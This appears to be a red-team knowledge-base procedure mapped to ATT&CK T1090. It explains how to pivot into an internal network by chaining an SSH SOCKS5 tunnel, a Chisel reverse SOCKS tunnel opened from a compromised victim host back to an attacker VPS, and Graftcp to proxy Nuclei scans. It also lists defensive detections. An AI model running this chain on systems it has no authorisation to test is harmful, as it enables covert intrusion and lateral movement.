---
id: 4e8b7b9d-a781-43b4-80eb-9f8fbb5956ed
name: Proxify-Go-Application-with-Graftcp
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:22.560667+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Proxy|T1090 - Proxy]]'
sub_techniques:
  - '[[sub-techniques/Internal-Proxy|T1090.001 - Internal Proxy]]'
tags:
  - graftcp
  - chisel
  - network-pivoting
  - proxy
  - socks5
  - go-application
commands:
  - '[[commands/ssh-create-local-socks5-tunnel]]'
  - '[[commands/chisel-start-server]]'
  - '[[commands/chisel-start-client-reverse-socks]]'
  - '[[commands/graftcp-local-start-with-socks5]]'
  - '[[commands/graftcp-run-nuclei-example]]'
platforms:
  - Linux
tools:
  - '[[tools/Graftcp]]'
  - '[[tools/Chisel]]'
  - '[[tools/Nuclei]]'
validated: true
---

# Proxify-Go-Application-with-Graftcp

## Summary

This procedure demonstrates how to proxify a Go-based application, such as the Nuclei vulnerability scanner, using Graftcp to route its traffic through a SOCKS5 proxy. This enables network pivoting by directing application traffic via a compromised host or intermediate VPS, allowing attackers to bypass network restrictions and access internal resources during lateral movement.

## Description

Graftcp is a lightweight tool designed to intercept and redirect network traffic from Go applications through a specified proxy, similar to Proxychains but optimized for Go binaries. In this procedure, a SOCKS5 proxy is established using an SSH tunnel to a VPS, combined with Chisel for creating a reverse tunnel from a compromised host. This setup allows the attacker's Go application to send traffic through the proxy chain, effectively pivoting through the compromised environment. The technique is useful in red team engagements for scanning or exploiting internal networks without direct access, mapping to MITRE ATT&CK's Proxy (T1090) for evading detection and enabling lateral movement. Prerequisites include access to a VPS or compromised host with SSH/Chisel installed, and the target Go application (e.g., Nuclei) on the attacker's machine.

## Requirements

1. SSH access to a VPS or intermediate host with root privileges.
2. Chisel binary installed on the VPS and compromised host.
3. Graftcp binary installed on the attacker's machine.
4. A Go application (e.g., Nuclei) to proxify.
5. Network access to the VPS (port 8443 for Chisel) and compromised host.
6. Private SSH key for authentication.

## Defense

- Monitor for unusual SSH tunneling or Chisel connections on perimeter hosts (e.g., via firewall logs for port 8443/TLS traffic).
- Implement proxy-aware network segmentation and inspect outbound SOCKS5 traffic.
- Use application whitelisting to prevent unauthorized Go binaries like Graftcp from executing.
- Enable behavioral analytics to detect anomalous network pivoting patterns, such as internal scans originating from proxied sources.

## Objectives

1. Establish a SOCKS5 proxy chain through a VPS and compromised host for traffic redirection.
2. Configure and launch Graftcp to intercept Go application traffic.
3. Execute a proxified Go application to pivot network access and perform internal reconnaissance or exploitation.
4. Verify successful traffic routing without direct exposure of the attacker's IP.

## Instructions

### Step 1: Establish Local SOCKS5 Tunnel via SSH

**Context**: Create a local SOCKS5 proxy on the attacker's machine by tunneling through SSH to the VPS. This provides the initial proxy endpoint (127.0.0.1:1080) that Graftcp will use. The tunnel forwards traffic to the VPS, which will later connect to the compromised host.

**Command** ([[commands/ssh-create-local-socks5-tunnel]]):
```bash
ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@$_VPS_IP
```

> This command runs SSH in the background (-fNT), uses a private key for authentication (-i), and creates a local port forward (-L) binding port 1080 on localhost to the same on the VPS. Replace $_VPS_IP with the VPS address. Expected output is no visible response if successful (use `ps aux | grep ssh` to verify the process is running). If the key is invalid or port is in use, it will error with connection refused or permission denied.

### Step 2: Start Chisel Server on VPS

**Context**: On the VPS, launch the Chisel server to accept reverse connections from the compromised host. This enables the creation of a SOCKS5 endpoint on the VPS that bridges to the internal network via the reverse tunnel.

**Command** ([[commands/chisel-start-server]]):
```bash
./chisel server --tls-key ./$_TLS_KEY --tls-cert ./$_TLS_CERT -p $_SERVER_PORT --reverse
```

> Run this on the VPS after SSHing into it. It starts a TLS-secured Chisel server listening on the specified port (default 8443) in reverse mode to allow clients to create tunnels back to the server. Provide paths to TLS key and cert files for encryption. Expected output: "Server started on :$_SERVER_PORT". Verify with netstat or ss for the listening port. Errors occur if files are missing or port is bound.

### Step 3: Start Chisel Client on Compromised Host

**Context**: On the compromised host, connect to the Chisel server on the VPS to establish a reverse SOCKS5 tunnel. This routes traffic from the VPS (and thus the attacker's proxy) into the internal network of the compromised host.

**Command** ([[commands/chisel-start-client-reverse-socks]]):
```bash
./chisel client --tls-skip-verify https://$_VPS_IP:$_SERVER_PORT R:socks
```

> Execute this on the compromised host (e.g., victim machine). The 'R:socks' flag creates a reverse SOCKS5 tunnel. Skip TLS verification for self-signed certs. Expected output: Connection logs like "Connected to server" and tunnel establishment. Success is indicated by no errors and active tunnel (check VPS for new SOCKS listener, typically on 1080). If connection fails, check firewall or cert issues.

### Step 4: Launch Graftcp Local Proxy

**Context**: Start the Graftcp local listener on the attacker's machine, configured to use the SSH-tunneled SOCKS5 proxy. This intercepts outgoing connections from the Go application and redirects them through the proxy chain.

**Command** ([[commands/graftcp-local-start-with-socks5]]):
```bash
graftcp-local -listen :$_LISTEN_PORT -logfile $_LOG_FILE -loglevel $_LOG_LEVEL -socks5 127.0.0.1:1080
```

> Run this after the tunnel is up. It listens on the specified port (default 2233) for proxified executions. Logs are written to the file at the chosen level (1-6). Expected output: Startup logs like "Listening on :$_LISTEN_PORT" with no errors. Verify by checking the log file for proxy connections. If SOCKS5 is unavailable, it will fail to bind or connect.

### Step 5: Execute Proxified Go Application

**Context**: Run the Go application (e.g., Nuclei) prefixed with Graftcp to force its traffic through the proxy. This demonstrates pivoting, as scans or requests will appear to originate from the compromised host's network.

**Command** ([[commands/graftcp-run-nuclei-example]]):
```bash
graftcp ./nuclei -u $_TARGET_URL
```

> Prefix the application binary with 'graftcp' to proxify it. For Nuclei, specify the target URL. Expected output: Nuclei's standard scan results, but with logs in Graftcp showing routed traffic (e.g., connections via SOCKS5). Success is confirmed if the application connects to internal resources unreachable directly. Check Graftcp logs for any proxy errors; failure indicates misconfigured tunnel.
